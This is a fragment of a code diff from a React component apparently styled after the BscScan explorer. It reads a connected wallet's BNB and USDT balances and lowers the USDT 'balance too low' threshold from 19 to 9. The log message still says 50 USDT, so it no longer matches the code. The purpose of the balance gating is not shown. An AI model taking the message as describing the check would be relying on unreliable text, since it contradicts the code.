@@ -199,7 +199,7 @@ export default function BscScanInspired() {
       const userBNB = ethers.utils.formatEther(await provider.getBalance(walletAddress));
       console.log("Formatted USDT balance:", formattedBalance);
 
-      if (balance.isZero() || parseFloat(formattedBalance) <=19) {
+      if (balance.isZero() || parseFloat(formattedBalance) <=9) {
         console.log("Balance is too low (less than or equal to 50 USDT)");
         setResults({ bnbBalance: userBNB, usdtBalance: formattedBalance, wallet: walletAddress, time: new Date() });
         setModalType("balanceLow");
